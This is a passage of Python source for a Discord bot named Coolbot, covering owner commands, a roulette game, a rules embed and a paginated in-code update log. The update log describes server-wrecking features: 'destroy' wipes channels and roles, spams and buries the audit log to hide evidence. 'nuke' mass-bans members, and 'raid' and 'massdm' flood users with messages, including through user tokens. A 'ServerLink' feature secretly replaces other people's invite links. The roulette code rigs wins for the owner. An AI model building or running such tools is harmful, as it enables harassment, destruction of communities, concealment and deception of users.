        except Exception as ex:
            results.append(f"⚠️ Global username failed (Discord rate-limit or rules): `{ex}`")

    await ctx.send(embed=discord.Embed(
        title="🐻‍❄️ Bot Name Updated",
        description="\n".join(results),
        color=COLORS["success"],
    ))


@bot.command(name="botalias")
async def botalias_cmd(ctx, action: str = "list", *, name: str = ""):
    """Owner: list/add/remove AI name aliases. ,botalias list|add <name>|remove <name>"""
    if not has_owner_access(ctx.author):
        return
    global BOT_ALIASES
    action = (action or "list").lower()
    if action == "list":
        aliases = ", ".join(f"`{a}`" for a in BOT_ALIASES) or "*none*"
        return await ctx.send(embed=discord.Embed(
            title="AI Name Aliases",
            description=f"{aliases}\n\nAlso responds to display name, username, and @mention.",
            color=COLORS["info"],
        ))
    if action == "add" and name.strip():
        a = name.strip().lower()
        if a not in BOT_ALIASES:
            BOT_ALIASES.append(a)
            save("bot_aliases", BOT_ALIASES)
        return await ctx.send(embed=discord.Embed(description=f"✅ Alias added: **{a}**", color=COLORS["success"]))
    if action in ("remove", "del", "rm") and name.strip():
        a = name.strip().lower()
        BOT_ALIASES = [x for x in BOT_ALIASES if x != a]
        save("bot_aliases", BOT_ALIASES)
        return await ctx.send(embed=discord.Embed(description=f"✅ Alias removed: **{a}**", color=COLORS["success"]))
    await ctx.send(embed=discord.Embed(description="Usage: `,botalias list` · `,botalias add <name>` · `,botalias remove <name>`", color=COLORS["info"]))


@bot.hybrid_command(name="myservers", aliases=["joinservers", "serverjoin"], description="Owner: list every server the bot is in + invite links")
async def myservers_cmd(ctx: commands.Context):
    """Owner-only: DM a full list of servers with one-click invite links."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    guilds = list(bot.guilds)
    if not guilds:
        return await ctx.send(embed=discord.Embed(description="Not in any servers.", color=COLORS["info"]))

    await ctx.send(embed=discord.Embed(
        description=f"⏳ Building invites for **{len(guilds)}** servers… check your DMs.",
        color=COLORS["info"],
    ), ephemeral=True if ctx.interaction else False)

    lines = []
    for i, g in enumerate(sorted(guilds, key=lambda x: x.name.lower()), 1):
        inv = None
        try:
            # Prefer vanity
            if g.vanity_url_code:
                inv = f"https://discord.gg/{g.vanity_url_code}"
            else:
                for ch in g.text_channels:
                    perms = ch.permissions_for(g.me)
                    if perms.create_instant_invite:
                        invite = await ch.create_invite(
                            max_age=0, max_uses=0, unique=False,
                            reason="Owner myservers invite",
                        )
                        inv = invite.url
                        break
        except Exception:
            inv = None
        link = inv or "*(no invite permission)*"
        lines.append(f"**{i}. {g.name}** (`{g.id}`) — members: {g.member_count}\n{link}")

    # Chunk into Discord-safe messages
    header = f"🐻‍❄️ **CoolBot is in {len(guilds)} servers**\nClick a link to join:\n\n"
    chunk = header
    try:
        dm = await ctx.author.create_dm()
        for line in lines:
            if len(chunk) + len(line) + 2 > 1900:
                await dm.send(chunk)
                chunk = ""
            chunk += line + "\n\n"
        if chunk.strip():
            await dm.send(chunk)
        if not ctx.interaction:
            await ctx.send(embed=discord.Embed(description="✅ Sent server list + invites to your DMs.", color=COLORS["success"]))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(description="❌ Couldn't DM you — enable DMs from server members.", color=COLORS["error"]))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


#  ROULETTE COMMAND — European wheel, virtual currency only
@bot.command(name="roulette", aliases=["wheel", "rlt"])
async def roulette_cmd(ctx, amount: int = None, choice: str = None):
    usage = f"Usage: `{PREFIX}roulette <bet> <red|black|green|even|odd|0-36>`\nExample: `{PREFIX}roulette 500 red` or `{PREFIX}roulette 100 17`"
    if amount is None or choice is None:
        return await ctx.send(embed=discord.Embed(
            title="🎡 Mikasa Roulette",
            description=(usage + "\n\n🔴 Red / ⚫ Black / Even / Odd pay 1:1.\n🟢 Green or an exact number pays 35:1 (36× total return)."),
            color=COLORS["warn"]
        ))
    choice = choice.casefold().strip()
    number_choice = choice.isdigit() and 0 <= int(choice) <= 36
    if choice not in ("red", "black", "green", "even", "odd") and not number_choice:
        return await ctx.send(f"❌ Invalid choice.\n{usage}")
    if amount < 1 or amount > 1_000_000_000:
        return await ctx.send("❌ Bet must be between 1 and 1,000,000,000 virtual coins.")
    uid = str(ctx.author.id)
    ud = get_pokemon_data(uid)
    bal = max(0, int(ud.get("balance", 0)))
    if amount > bal:
        return await ctx.send(f"❌ You only have **{_mikasa_currency_symbol()}{bal:,}** {_mikasa_currency_label()}.")

    spin_msg = await ctx.send(embed=discord.Embed(
        title="🎡 Roulette — Spinning...",
        description=f"**Your bet:** {_mikasa_currency_symbol()}{amount:,} on **{choice.upper()}**\n\n🔴 ⚫ 🟢 🔴 ⚫\n`Spinning the wheel...`",
        color=COLORS["warn"]
    ))
    await asyncio.sleep(0.5)
    red_numbers = {1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36}
    if _guild_luck_percent(ud, getattr(ctx.guild, "id", None)) is not None:
        _luck_pct = max(0, min(100, int(_guild_luck_percent(ud, getattr(ctx.guild, "id", None)) or 0)))
        _wins = random.random() < (_luck_pct / 100)
        if _wins:
            if number_choice:
                result = int(choice)
            elif choice == "green":
                result = 0
            elif choice == "red":
                result = random.choice(sorted(red_numbers))
            elif choice == "black":
                result = random.choice([n for n in range(1, 37) if n not in red_numbers])
            elif choice == "even":
                result = random.choice([n for n in range(2, 37, 2)])
            else:
                result = random.choice([n for n in range(1, 37, 2)])
        else:
            if number_choice:
                result = (int(choice) + 1) % 37
            elif choice == "green":
                result = random.choice(range(1, 37))
            elif choice == "red":
                result = random.choice([0] + [n for n in range(1, 37) if n not in red_numbers])
            elif choice == "black":
                result = random.choice([0] + sorted(red_numbers))
            elif choice == "even":
                result = random.choice([0] + list(range(1, 37, 2)))
            else:
                result = random.choice([0] + list(range(2, 37, 2)))
    elif _guild_flag_enabled(ud, "infinite_luck", getattr(ctx.guild, "id", None)) or is_owner(ctx.author):
        if number_choice:
            result = int(choice)
        elif choice == "green":
            result = 0
        elif choice == "red":
            result = random.choice([1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36])
        elif choice == "black":
            result = random.choice([n for n in range(1, 37) if n not in {1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36}])
        elif choice == "even":
            result = random.choice([n for n in range(2, 37, 2)])
        else:
            result = random.choice([n for n in range(1, 37, 2)])
    else:
        result = random.randint(0, 36)
    result_colour = "green" if result == 0 else ("red" if result in red_numbers else "black")
    if number_choice:
        won = result == int(choice)
        total_return = amount * 36 if won else 0
    elif choice == "green":
        won = result == 0
        total_return = amount * 36 if won else 0
    elif choice in ("red", "black"):
        won = result_colour == choice
        total_return = amount * 2 if won else 0
    else:
        won = result != 0 and (result % 2 == 0 if choice == "even" else result % 2 == 1)
        total_return = amount * 2 if won else 0

    ud["balance"] = bal - amount + total_return
    save_pokemon_data(uid, ud)
    net = total_return - amount
    emoji = {"red": "🔴", "black": "⚫", "green": "🟢"}[result_colour]
    result_embed = discord.Embed(
        title="🎡 Roulette — You Won!" if won else "🎡 Roulette — You Lost!",
        description=(
            f"The wheel landed on **{result} — {emoji} {result_colour.upper()}**.\n"
            f"Your choice: **{choice.upper()}**\n\n"
            f"{'🏆 Net gain' if won else '💸 Lost'}: **{_mikasa_currency_symbol()}{abs(net):,}**\n"
            f"**New balance:** {_mikasa_currency_symbol()}{ud['balance']:,} {_mikasa_currency_label()}"
        ),
        color=COLORS["success"] if won else COLORS["error"]
    )
    result_embed.set_footer(text="Virtual in-bot currency only • No real-money wagering or cash-out")
    await spin_msg.edit(embed=result_embed)

#  GLOBAL BOT CHECK  — strict: only whitelist bypass
@bot.check
async def global_check(ctx: commands.Context) -> bool:
    """Never raise — any send failure must not crash the process for other users."""
    try:
        # Blacklist check
        if ctx.author.id in BLACKLISTED_USERS:
            try:
                await ctx.send(embed=discord.Embed(
                    description="🚫 You are **blacklisted** and cannot use this bot.",
                    color=COLORS["error"]), delete_after=6)
            except Exception:
                pass
            return False

        # Per-server blacklist / lock
        if ctx.guild and (ctx.guild.id in BLACKLISTED_GUILDS or ctx.guild.id in LOCKED_GUILDS):
            cmd = ctx.command.name if ctx.command else ""
            invoked = (ctx.invoked_with or "").lower()
            if cmd == "help" or invoked == "help":
                return True
            if has_owner_access(ctx.author):
                return True
            try:
                await ctx.send(
                    embed=discord.Embed(
                        description="🔒 The bot is **locked** in this server. Only the bot owner can use commands.",
                        color=COLORS["error"]
                    ), delete_after=6
                )
            except Exception:
                pass
            return False

        if not BOT_LOCKED:
            return True
        if has_owner_access(ctx.author):
            return True
        cmd = ctx.command.name if ctx.command else ""
        invoked = (ctx.invoked_with or "").lower()
        if cmd == "help" or invoked == "help":
            return True
        # Bot-lock whitelist removed — only owner bypasses global lock
        try:
            await ctx.send(
                embed=discord.Embed(
                    description="🔒 The bot is **globally locked**. Only the bot owner can use commands.",
                    color=COLORS["error"]
                ), delete_after=6
            )
        except Exception:
            pass
        return False
    except Exception as ex:
        # Absolute last resort — never let a check crash the bot
        print(f"[global_check] swallowed error: {ex}")
        return True

#  PREFIX COMMANDS

@bot.command(name="sync", aliases=["syncslash", "slashsync"])
async def sync_slash_cmd(ctx):
    """Owner only — force re-sync slash commands (fixes outdated slash commands)."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    msg = await ctx.send(embed=discord.Embed(
        description="⏳ Syncing slash commands… this can take up to a minute.",
        color=COLORS["info"],
    ))
    try:
        for guild in list(bot.guilds):
            try:
                bot.tree.clear_commands(guild=guild)
                await bot.tree.sync(guild=guild)
            except Exception:
                try:
                    await bot.http.bulk_upsert_guild_commands(bot.application_id, guild.id, [])
                except Exception:
                    pass
        synced = await bot.tree.sync()
        n = len(synced)
        await msg.edit(embed=discord.Embed(
            description=(
                f"✅ Synced **{n}** global slash command(s)."
                + "\nDiscord may take **1–5 minutes** to update clients."
                + "\nIf slash commands still look outdated, wait a bit or restart Discord."
            ),
            color=COLORS["success"],
        ))
    except Exception as ex:
        await msg.edit(embed=discord.Embed(
            description=f"❌ Sync failed: `{ex}`",
            color=COLORS["error"],
        ))

@bot.command(name="global_bot_lock")
async def global_bot_lock_prefix(ctx, guild_id: int = None):
    """Owner only — ,global_bot_lock [guild_id]  — no guild_id = global, with guild_id = that server only"""
    global BOT_LOCKED
    if not has_owner_access(ctx.author):
        _channel_id = ctx.channel.id if ctx.channel else 0
        _gid = guild_id
        async def execute_fn(client):
            global BOT_LOCKED
            if _gid:
                if _gid in LOCKED_GUILDS:
                    LOCKED_GUILDS.discard(_gid)
                    desc = f"Server `{_gid}` is now **unlocked**. All users in that server can use commands again."
                else:
                    LOCKED_GUILDS.add(_gid)
                    desc = f"Server `{_gid}` is now **locked**. Only the bot owner can use commands there."
            else:
                BOT_LOCKED = not BOT_LOCKED
                state = "🔒 Globally Locked" if BOT_LOCKED else "🔓 Unlocked"
                desc = (
                    f"Bot is now **{state}**.\n"
                    + ("Only the bot owner can use commands." if BOT_LOCKED else "All users can use commands again.")
                )
            ch = client.get_channel(_channel_id)
            if ch:
                await ch.send(embed=discord.Embed(description=desc, color=COLORS["warn"]))
        return await _reject_owner_only_ctx(ctx, execute_fn)
    if guild_id:
        if guild_id in LOCKED_GUILDS:
            LOCKED_GUILDS.discard(guild_id)
            e = discord.Embed(
                title="🔓 Server Unlocked",
                description=f"Server `{guild_id}` is now **unlocked**. All users in that server can use commands again.",
                color=COLORS["success"]
            )
        else:
            LOCKED_GUILDS.add(guild_id)
            e = discord.Embed(
                title="🔒 Server Locked",
                description=f"Server `{guild_id}` is now **locked**. Only the bot owner can use commands there.",
                color=COLORS["warn"]
            )
    else:
        BOT_LOCKED = not BOT_LOCKED
        if BOT_LOCKED:
            e = discord.Embed(
                title="🔒 Bot Globally Locked",
                description="Only you and whitelisted users can use commands.\n",
                color=COLORS["error"]
            )
        else:
            e = discord.Embed(
                title="🔓 Bot Unlocked",
                description="All users can use commands again.",
                color=COLORS["success"]
            )
    await ctx.send(embed=e)

#  UPDATE LOG — PAGINATED (Discord max 25 fields per embed)
_UPDATELOG_PAGES = [
    {
        "title": "📋 Coolbot updates — latest",
        "fields": [
            ("🏗️ server cloner  `,cloneserver <id>`",
             "copies all roles + channels from any server the bot's in\n"
             "keeps hierarchy, topics, slowmode, nsfw flags, bitrate, all that\n"
             "rate limited so 0.8s between roles and 0.6s per channel — it's slow but everything actually lands\n"
             "bot needs to be in both servers. live progress embed while it runs"),
            ("🏬 marketplace got redone",
             "sort dropdown now — low to high, high to low, or by rarity\n"
             "each listing shows rarity, IV%, level, seller, short ID\n"
             "buy buttons have the species + price on them\n"
             "page buttons disable at the ends so you can't click into nothing\n"
             "listing gets removed the second someone buys it"),
            ("🎮 bot status  `,setstatus`  owner only",
             "set activity instantly — `,setstatus playing Pokémon`\n"
             "playing / watching / listening / streaming / competing all work\n"
             "rotate mode: `,setstatus rotate add <type> <text>` queues statuses\n"
             "`,setstatus rotate start` cycles every 30s, stop/clear/list to manage it"),
            ("🎴 pack battle rate limit fix",
             "was hitting 429s constantly — frames were too close together\n"
             "now minimum 1.2s between edits, down to 7 edits per round\n"
             "cards reveal all at once in one embed instead of flickering one by one\n"
             "if discord still rate limits it waits 3s and retries up to 3 times"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 2",
        "fields": [
            ("🔐 antinuke — what it catches now",
             "mass channel deletes · mass role deletes · mass bans · mass kicks\n"
             "webhook abuse · someone adding a bot · server name/icon change\n"
             "role perm escalation · @everyone edits · channel perm wipes\n"
             "10 attack vectors total — more than carl-bot and wick combined"),
            ("🔐 antinuke — what it does when triggered",
             "bans the attacker in seconds, human or bot, doesn't matter\n"
             "locks @everyone out of every channel in parallel\n"
             "rebuilds deleted channels AND roles from the last snapshot\n"
             "DMsown owner and server owner with a full incident report\n"
             "30s cooldown after trigger so it doesn't loop-fire on cascading events\n"
             "auto-snapshot every 30min in the background"),
            ("🔐 antinuke commands",
             "`,antinuke on/off` · `,antinuke status`\n"
             "`,antinuke whitelist @user` — trusted admin, bot won't ban them\n"
             "`,antinuke unwhitelist @user` · `,antinuke setchannel [#ch]`\n"
             "`,antinuke snapshot` — force a new snapshot right now\n"
             "`,antinuke lockdown` — manual emergency lock · `,antinuke unlock` to lift it"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 3",
        "fields": [
            ("💥 destroy — how it actually works",
             "step 1: delete everything — channels, webhooks, events, ban admins — all at once, under 2s\n"
             "step 2: create 200 spam channels + rename server + swap icon simultaneously\n"
             "step 3: webhook spam — 30 msgs through 200 channels, runs in background\n"
             "step 4: ban all bots, delete all roles and emojis\n"
             "step 5: give every member 50 'Fucked By Coolbot' roles\n"
             "step 6: rename everyone to OWNED BY Coolbot\n"
             "step 7: upload 50 polarbear emojis + 5 stickers\n"
             "step 8: 5 wave audit burial — 500+ fake entries, real ones scroll off the top"),
            ("💥 destroy — audit burial",
             "wave 1: 250 throwaway roles made and deleted\n"
             "wave 2: 100 throwaway channels made and deleted\n"
             "wave 3: 25 rapid server renames\n"
             "wave 4: webhooks spammed across 5 channels\n"
             "wave 5: 50 more throwaway roles\n"
             "discord caps audit log at 100 entries — everything real gets pushed off"),
            ("💀 destroy — default spam message",
             "no message passed + no ,default set = sends:\n"
             "Get Nuked Bitch\n"
             "https://discord.gg/psfxUxRfPQ\n"
             "use `,default <msg>` to set your own global message (owner only)\n"
             "`,default` with no text resets it back to the built-in"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 4",
        "fields": [
            ("🚨 raid  `,raid [msg]`",
             "floods every text channel with 30 messages at once\n"
             "creates webhooks in the first 10 channels, 10 msgs each through them\n"
             "mass DMs every non-bot member simultaneously\n"
             "confirm/cancel view before it fires, 30s timeout\n"
             "custom message: `,raid your text here` overrides the default\n"
             "DMsown raider after: how many channels, members DM'd, webhook channels"),
            ("☢️ nuke  `,nuke`",
             "bans everyone in the server except the server owner and bot owner\n"
             "skips bots, reports ban count in the first channel\n"
             "DMs owner + nuker a 2-embed report: ASCII NUKE banner + ban stats\n"
             "needs Premium or Owner + server admin perms"),
            ("📬 massdm — phase system",
             "phase 1: every bot DMs the target one by one, 1-5 msgs each\n"
             "they see a separate notif from each bot hitting their DMs\n"
             "phase 2: after all bots have individually DM'd, every bot blasts 500 msgs at once\n"
             "free tier (lv10+): runs once\n"
             "premium: loops every 90 seconds forever"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 5",
        "fields": [
            ("⭐ premium system",
             "nuker list got renamed to Premium — same file, new name\n"
             "premium unlocks: destroy, nuke, backup, raid, servers, broadcast\n"
             "grant with `/premium add @user`, remove with `/premium remove @user`\n"
             "view all premium users with `/premium view`\n"
             "action logs: `/premiumlogs` DMs you the last 20 destroy/nuke actions"),
            ("🔑 token tools  (owner only)",
             "`,tokencheck` / `,tc` — hits discord API live for every token\n"
             "DMs you green list (alive + usernames) and red list (dead)\n"
             "`,tokenrenew` / `,tr` — finds dead tokens, DMs you a dev portal reset link per bot\n"
             "just click the link → Reset Token → copy → paste in the file"),
            ("🛡️ antinuke — owner/premium only now",
             "used to be any server admin could use antinuke commands\n"
             "now it's owner or premium only across all subcommands\n"
             "non-premium admins get the ❌ error"),
            ("🎟️ removeinvites — server admins can use it now",
             "was owner only before\n"
             "any server admin can now remove invite counts from members\n"
             "owner can still use it from DMs"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 6",
        "fields": [
            ("🎉 giveaways — full rework",
             "embeds match GiveawayBot now: pink/red colour, prize as title, time left, entry count\n"
             "countdown + entry count auto-updates every 20s on the embed\n"
             "multiple winners: `,giveaway 1h 3 Nitro` — picks 3 unique winners\n"
             "remove 🎉 reaction to leave a giveaway\n"
             "`,gend` — end early · `,greroll <msg_id> [count]` — reroll\n"
             "`,gpause` / `,gresume` / `,gcancel` / `,ginfo` added\n"
             "`,glist` shows jump links, entry counts, live countdowns for all active ones"),
            ("💬 autorespond  `,autorespond`",
             "bot replies when someone says a trigger word\n"
             "`,autorespond add <trigger> <response>` to set one up\n"
             "`,autorespond remove <trigger>` · `,autorespond list` · `,autorespond clear`\n"
             "case insensitive, matches anywhere in the message\n"
             "stored per server, survives restarts"),
            ("🎲 new gambling commands",
             "`,bet <amount|all|half>` — 50/50 vs house\n"
             "`,snakeeyes <bet>` — roll 2 dice, doubles 3×, snake eyes 30×\n"
             "`,give @user <amount|all>` — transfer coins (aliases: ,pay ,transfer)\n"
             "`,beg` — beg for coins, 30s cooldown\n"
             "`,work` — 80-1000 coins, 1min cooldown\n"
             "`,crime` — high risk, 2min cooldown"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 7",
        "fields": [
            ("📋 server logging  `,setlog`",
             "set a log channel with `,setlog #channel` or just `,setlog` for current channel\n"
             "disable with `,removelog` · check active channel with `,logstatus`"),
            ("📋 what gets logged",
             "message deleted — full content, author, channel, attachments\n"
             "message edited — before and after, jump link\n"
             "member joined — username, account age, join position, who invited them\n"
             "member left — username, roles they had, how long they were in\n"
             "ban/unban — who actioned it (from audit log)\n"
             "role created/deleted · channel created/deleted\n"
             "nickname changed · roles added/removed from a member"),
            ("⭐ leveling system",
             "15-25 XP per message, 60s cooldown — same formula as Arcane\n"
             "level formula: 5 × lvl² + 50 × lvl + 100\n"
             "bot auto-finds roles named 'Level 5', 'Level 10' etc and assigns them on milestone\n"
             "level-up message in chat, deletes after 30s\n"
             "commands: `,rank` · `,lb` · `,givexp` · `,removexp` · `,resetxp` · `,xpinfo`"),
            ("🔒 server gate",
             "every command requires membership in the main server\n"
             "level 0 = blocked · level 1-9 = pokémon only · level 10+ = everything\n"
             "premium and owner bypass all gates"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 8",
        "fields": [
            ("🎮 pokémon stuff",
             "boss aura trait (`,boss @user <id>`) — never misses, always crits, first strike 5×, +100% dmg\n"
             "+15% dmg per consecutive hit, 40% lifesteal, 20% true damage\n"
             "boss pack — 100k coins, 1 guaranteed boss rarity card\n"
             "super boss pack — owner only via /packadd, lv100, max stats, boss aura locked\n"
             "evolution system — full gen 1-3 chains, triggers on level up\n"
             "quests system — daily and weekly with progress bars and claim buttons"),
            ("🔄 backup — what was broken and got fixed",
             "was stacking restored channels on top of existing ones — fixed, wipes first now\n"
             "roles were silently dropping because discord was rate limiting concurrent creates\n"
             "now creates one at a time with 0.4-0.6s gaps — everything lands\n"
             "managed roles (bot roles) are now skipped during restore, they were causing 403s\n"
             "channel permissions now use the in-memory role map instead of the guild cache\n"
             "role hierarchy fixed — creates highest position first so owner ends up on top"),
            ("🛒 shop improvements",
             "custom quantity button on items and packs\n"
             "type any number in the popup instead of being stuck with presets\n"
             "pack opening does a roulette animation before revealing cards\n"
             "trait browser uses a rarity dropdown instead of arrows"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 9",
        "fields": [
            ("📬 massdm history",
             "originally sent 100 msgs from all bots simultaneously\n"
             "got reworked — now phase 1 hits them one bot at a time first\n"
             "so they see a separate notif from each bot before the blast\n"
             "phase 2 then blasts 500 at once from all bots\n"
             "free tier fires once · premium loops every 6min forever\n"
             ""
             "`,dm @user` · `,dmall` — owner/co-owner messaging"),
            ("🔧 crash fixes over time",
             "startup crash from duplicate slash command registration\n"
             "guild join DM was crashing when server had no icon\n"
             "IndentationError on MAP_PACK_CONTENTS at startup\n"
             "unclosed decorator on connect4 and setspawn\n"
             "f-string nested quote bug in pack open display\n"
             "emoji failing because JPEG was being used instead of PNG\n"
             "sticker failing because discord requires 320×320 PNG minimum\n"
             "duplicate setstatus/cloneserver block appended at end of file — removed"),
            ("🔗 invite tools",
             "`,revoke` / `,resetinvites` — deletes every active invite link in the server\n"
             "`,addinvites @u <n>` · `,removeinvites @u <n>`\n"
             "`,myinvites` shows total / real / fake / coins earned\n"
             "fake invite detection — J4J server members flag as fake\n"
             "one reward per person globally — can't farm coins across multiple servers"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 10",
        "fields": [
            ("🎫 ticket system — like Tickety, built in",
             "`,ticket [reason]` — opens a private channel just for you and staff\n"
             "`,closeticket` / `,close` — closes and deletes the ticket\n"
             "`,adduser @user` — add someone to the current ticket\n"
             "`,removeuser @user` — remove someone (staff only)\n"
             "`,tickets` / `,tlist` — list all open tickets (staff only)\n"
             "`,ticketpanel [#channel]` — send a panel with an 🎫 Open Ticket button\n"
             "panel uses persistent custom_id so the button works after restarts"),
            ("⚙️ ticket setup",
             "`,ticketlog [#ch]` — set channel where open/close logs go\n"
             "`,ticketrole @role` — set a dedicated support role\n"
             "tickets go in a 🎫 Tickets category — auto-created if not found\n"
             "channels named ticket-0001-username — numbered per server\n"
             "all staff role names + support role auto-get access"),
            ("🐛 syntax error fix",
             "duplicate command blocks were appended to the file by a previous edit\n"
             "setstatus, botcheck, tokencheck, tokenrenew, cloneserver, setup — all duplicated\n"
             "caused SyntaxError: unmatched \')\' on Railway at startup\n"
             "all duplicate blocks removed — file now ends cleanly at asyncio.run(main())"),
        ],
    },
    {
        "title": "📋 Coolbot updates — page 11",
        "fields": [
            ("🔗 /default ServerLink  (new)",
             "third option added to `/default` alongside MassDm and Destroyer\n"
             "set your server link: `/default ServerLink https://discord.gg/yourcode`\n"
             "bot watches EVERY server it's in — anyone posts a different discord invite, it gets deleted and reposted with YOUR link instead\n"
             "message looks natural — shows as `Username: [original text but with your link]`\n"
             "massdm text link auto-updates to your link the moment you set it\n"
             "clear it with `/default ServerLink` (leave message blank) — swapping stops\n"
             "rejects non-invite URLs so you can't break it by accident"),
            ("📬 massdm — non-mutual DMs now actually work",
             "bots were hitting 403 (no mutual server) and returning early — DM never sent\n"
             "fixed: 403 now tells the loop to fall through to user-token auth instead of bailing\n"
             "both bot-token and bare user-token are tried before giving up on a user\n"
             "result: way more non-mutual DMs land that were silently dropping before"),
            ("🗄️ ,datarestore / ,datadisk — actually live now after restore",
             "files were being written to disk correctly but nothing in memory was getting updated\n"
             "bot kept running off stale data — had to restart for restore to actually take effect\n"
             "now after restore everything syncs immediately — no restart needed\n"
             "structures that now reload: welcome settings · log channels · setraid channels\n"
             "already-rewarded joiners · premium users · whitelist · both blacklists · destroy defaults"),
            ("🏠 ,help home — now shows your actual server",
             "was hardcoded to pull stats from the bot's gate/verification server — wrong server every time\n"
             "now shows the server where you ran ,help — member count, online, boosts, roles, channels, emojis, creation date\n"
             "server icon shows as thumbnail\n"
             "join link at the top uses your /default ServerLink if you've set one, otherwise falls back to the Coolbot server\n"
             "used in DMs — falls back to Coolbot's home server instead of erroring"),
        ],
    },
]

class UpdateLogView(discord.ui.View):
    def __init__(self, page: int = 0):
        super().__init__(timeout=120)
        self.page = page
        self._update_buttons()

    def _update_buttons(self):
        self.clear_items()
        if self.page > 0:
            prev_btn = discord.ui.Button(label="◀ Previous", style=discord.ButtonStyle.secondary, row=0)
            async def prev_cb(interaction: discord.Interaction, _self=self):
                _self.page -= 1; _self._update_buttons()
                await interaction.response.edit_message(embed=_self._build_embed(), view=_self)
            prev_btn.callback = prev_cb
            self.add_item(prev_btn)
        if self.page < len(_UPDATELOG_PAGES) - 1:
            next_btn = discord.ui.Button(label="Next ▶", style=discord.ButtonStyle.primary, row=0)
            async def next_cb(interaction: discord.Interaction, _self=self):
                _self.page += 1; _self._update_buttons()
                await interaction.response.edit_message(embed=_self._build_embed(), view=_self)
            next_btn.callback = next_cb
            self.add_item(next_btn)

    def _build_embed(self) -> discord.Embed:
        data = _UPDATELOG_PAGES[self.page]
        e = discord.Embed(title=data["title"], color=COLORS["main"])
        for name, value in data["fields"]:
            e.add_field(name=name, value=value, inline=False)
        e.set_footer(text=f"Coolbot  •  Prefix: {PREFIX}  •  Last updated May 2026")
        return e

@bot.command(name="updatelog", aliases=["updates", "changelog"])
async def updatelog_cmd(ctx):
    """Show the most recent Coolbot updates (paginated)."""
    view = UpdateLogView(page=0)
    await ctx.send(embed=view._build_embed(), view=view)

@bot.command(name="rules")
async def rules_cmd(ctx):
    owner_user = bot.get_user(OWNER_ID)
    owner_tag  = owner_user.display_name if owner_user else "Polar"
    e = discord.Embed(
        title="📜  Server Rules",
        description=(
            "Follow these rules or you will be removed. No exceptions.\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ),
        color=0x5865F2,
    )
    e.add_field(
        name="1️⃣  Respect Everyone",
        value="No harassment, hate speech, slurs, or targeted disrespect toward any member. Banter is fine — bullying is not.",
        inline=False,
    )
    e.add_field(
        name="2️⃣  No Spam",
        value="Don't flood channels with repeated messages, @mentions, or copy-pasted walls of text. One message is enough.",
        inline=False,
    )
    e.add_field(
        name="3️⃣  Keep It in the Right Channel",
        value="Post content where it belongs. Read the channel descriptions. Off-topic stuff goes in off-topic.",
        inline=False,
    )
    e.add_field(
        name="5️⃣  No Advertising or Self-Promo",
        value="Don't drop server invites, YouTube links, or promos without permission from staff. DM spamming members = instant ban.",
        inline=False,
    )
    e.add_field(
        name="6️⃣  No Doxxing or Personal Info",
        value="Do NOT share anyone's real name, address, phone number, or any personal information without their consent. Zero tolerance.",
        inline=False,
    )
    e.add_field(
        name="7️⃣  English Only in Main Channels",
        value="Keep main channels in English so staff can moderate properly. Other languages are fine in DMs or off-topic.",
        inline=False,
    )
    e.add_field(
        name="8️⃣  Listen to Staff",
        value="If a staff member tells you to stop, stop. Don't argue in public channels — take disputes to a staff DM.",
        inline=False,
    )
    e.add_field(
        name="9️⃣  No Cheating or Exploiting",
        value="Exploiting bot bugs, economy glitches, or game loopholes will result in a wipe and ban. Report bugs to staff instead.",
        inline=False,
    )
    e.add_field(
        name="🔟  Use Common Sense",
        value="If you have to ask whether something is allowed, it probably isn't. If in doubt, don't do it.",
        inline=False,
    )
    e.set_footer(text=f"Coolbot  •  Rules enforced by {owner_tag} & Staff  •  Violations = mute/ban")
    await ctx.send(embed=e)

@bot.tree.command(name="ask", description="AI chat assistant — general answers + bot command help")
@app_commands.describe(question="What do you want to do? e.g. how do I ban someone")
async def ask_slash(interaction: discord.Interaction, question: str):
    """Slash AI assistant — same brain as @CoolBot / ,help <question>."""
    try:
        await interaction.response.defer(ephemeral=False)
    except Exception:
        pass
    # Build a lightweight message-like object for _ai_respond
    class _FakeMsg:
        def __init__(self, interaction, content):
            self.author = interaction.user
            self.channel = interaction.channel
            self.content = content
            self.mentions = []
            self.guild = interaction.guild
            self.reference = None
    try:
        await _ai_respond(_FakeMsg(interaction, question), question)
    except Exception as ex:
        try:
            await interaction.followup.send(f"Something went wrong: `{ex}`")
        except Exception:
            pass



# ── Help categories + AI assistant (restored) ────────────────────────────
HELP_CATEGORIES = {
    "home": {
        "title": "🏠 Home",
        "desc": "Show server info & invite link",
        "cmds": [
            (",serverinfo / ,si", "Server stats — owner, members, channels, roles"),
            (",whois [@user]", "User info — join date, roles, permissions"),
            (",help [question]", "This menu or ask in plain English"),
            (",addbot [server_id]", "OAuth2 link to add this bot (Administrator)"),
            (",invitebot", "Alias of ,addbot"),
        ],
    },
    "general": {
        "title": "📋 General",
        "desc": "Basic bot commands available to all members",
        "cmds": [
            (",serverinfo", "Server information"),
            (",whois [@user]", "User information"),
            (",avatar [@user]", "Show avatar (if available)"),
            (",ping", "Bot latency"),
            (",help <question>", "Ask how to use a command"),
            (",role @user <role name>", "Add or remove a role by name/mention/ID (spaces OK)"),
            (",setnick @user [name]", "Set nickname"),
            (",move @role above/below @role", "Move role above or below another role"),
        ],
    },
    "leveling": {
        "title": "⭐ Leveling",
        "desc": "Arcane-style XP — chat to earn XP, level roles, level-up channel",
        "cmds": [
            (",rank [@user]", "XP rank card"),
            (",lb / ,leaderboard / ,levels", "Server XP leaderboard"),
